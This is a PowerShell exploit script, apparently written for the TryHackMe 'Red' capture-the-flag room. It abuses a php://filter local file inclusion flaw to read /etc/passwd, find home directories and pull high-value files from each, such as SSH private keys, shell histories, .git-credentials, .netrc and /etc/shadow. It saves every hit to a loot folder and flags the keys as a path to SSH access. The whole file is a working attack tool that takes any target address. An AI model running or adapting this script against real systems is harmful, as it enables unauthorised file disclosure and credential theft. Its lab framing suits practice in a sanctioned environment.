<#
.SYNOPSIS
    LFI file-looter for TryHackMe "Red". Given a confirmed php://filter LFI,
    reads /etc/passwd, parses out every home directory, and auto-pulls a
    curated list of high-value files from each - plus a set of system files.
    This is the "expand after passwd" step: the file you already read tells
    the script where to look next.
.USAGE
    .\lfi_read.ps1 -Target 10.146.184.99
    .\lfi_read.ps1 -Target 10.146.184.99 -DelayMs 800
#>
param(
    [Parameter(Mandatory=$true)][string]$Target,
    [int]$Port     = 80,
    [string]$LfiPage = "index.php",
    [string]$Param   = "page",
    [int]$DelayMs    = 600
)

$ErrorActionPreference = 'SilentlyContinue'
$outDir = Join-Path $PSScriptRoot "loot_lfi_$($Target -replace '\.','_')"
New-Item -ItemType Directory -Force -Path $outDir | Out-Null

$script:UA   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
$script:Sess = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$script:Sess.UserAgent = $script:UA

$base = "http://${Target}:${Port}/${LfiPage}?${Param}="

function Log { param($m,$c='Gray'); Write-Host ("[{0}] {1}" -f (Get-Date -Format HH:mm:ss), $m) -ForegroundColor $c }

function Read-File {
    param([string]$AbsPath)
    # plain passthrough read (works for text like passwd/.bash_history/id_rsa)
    try {
        $r = Invoke-WebRequest -Uri ($base + "php://filter/resource=$AbsPath") -UseBasicParsing `
             -TimeoutSec 20 -WebSession $script:Sess -ErrorAction Stop
        return $r.Content
    } catch { return $null }
}
function Read-File-B64 {
    param([string]$AbsPath)
    # base64 variant - use when a plain read comes back empty (some files/filters need it)
    try {
        $r = Invoke-WebRequest -Uri ($base + "php://filter/convert.base64-encode/resource=$AbsPath") `
             -UseBasicParsing -TimeoutSec 20 -WebSession $script:Sess -ErrorAction Stop
        $t = $r.Content.Trim()
        if ($t -match '^[A-Za-z0-9+/=\r\n]+$' -and $t.Length -gt 0) {
            try { return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($t -replace '\s',''))) } catch {}
        }
    } catch {}
    return $null
}

# Baseline: read a definitely-nonexistent path so we know what a "miss" looks like
$missLen = (Read-File "/nonexistent_$(Get-Random).zzz").Length
Log "miss-baseline length = $missLen"

function Try-Path {
    param([string]$AbsPath)
    Start-Sleep -Milliseconds $DelayMs
    $body = Read-File $AbsPath
    if (-not $body -or $body.Length -le $missLen) {
        $body = Read-File-B64 $AbsPath      # fallback
        Start-Sleep -Milliseconds $DelayMs
    }
    if ($body -and $body.Length -gt $missLen) {
        $safe = ($AbsPath.TrimStart('/') -replace '[^\w.\-]','_')
        $body | Out-File (Join-Path $outDir $safe) -Encoding utf8
        Log ("  HIT  $AbsPath  (len=$($body.Length))") Green
        # show a short preview so wins surface immediately
        ($body -split "`n" | Select-Object -First 6) | ForEach-Object { if ($_.Trim()){ Log ("      | $($_.Trim())") DarkCyan } }
        return $true
    }
    Log ("  --   $AbsPath") DarkGray
    return $false
}

Log "=== LFI loot: $Target ===" Cyan

# 1. Read passwd, parse home dirs (root + any real user home under /home)
$passwd = Read-File "/etc/passwd"
if (-not $passwd) { Log "Could not read /etc/passwd - is the LFI still live? check target IP." Red; return }
$passwd | Out-File (Join-Path $outDir "etc_passwd") -Encoding utf8

$homes = New-Object System.Collections.Generic.List[string]
foreach ($line in ($passwd -split "`n")) {
    $f = $line -split ':'
    if ($f.Count -ge 6 -and $f[5] -and ($f[5] -like '/home/*' -or $f[5] -eq '/root')) {
        if ($homes -notcontains $f[5]) { $homes.Add($f[5].Trim()) }
    }
}
Log ("home dirs found: {0}" -f ($homes -join ', ')) Cyan

# 2. High-value files to try inside each home dir
$homeFiles = @(
    '.bash_history','.zsh_history','.reminder','.bashrc','.profile','.bash_logout',
    '.ssh/id_rsa','.ssh/id_ed25519','.ssh/authorized_keys','.ssh/known_hosts',
    '.mysql_history','.viminfo','.gitconfig','.git-credentials','.netrc',
    'user.txt','flag.txt','flag1.txt','flag.php','notes.txt','.creds','.password'
)

$hits = 0
foreach ($h in $homes) {
    Log "--- $h ---" Cyan
    foreach ($rel in $homeFiles) { if (Try-Path "$h/$rel") { $hits++ } }
}

# 3. System / service files worth a shot (room is 'redisl33t' - grab redis conf)
Log "--- system files ---" Cyan
$sysFiles = @(
    '/etc/redis/redis.conf','/etc/redis.conf','/etc/crontab','/etc/hosts',
    '/etc/apache2/sites-enabled/000-default.conf','/var/www/html/index.php',
    '/var/www/html/config.php','/etc/shadow'
)
foreach ($s in $sysFiles) { if (Try-Path $s) { $hits++ } }

Log ("=== Done. Hits: $hits   Loot: $outDir ===") Cyan
Log "Look first at *_bash_history and any id_rsa - those are your SSH-as-blue path." Yellow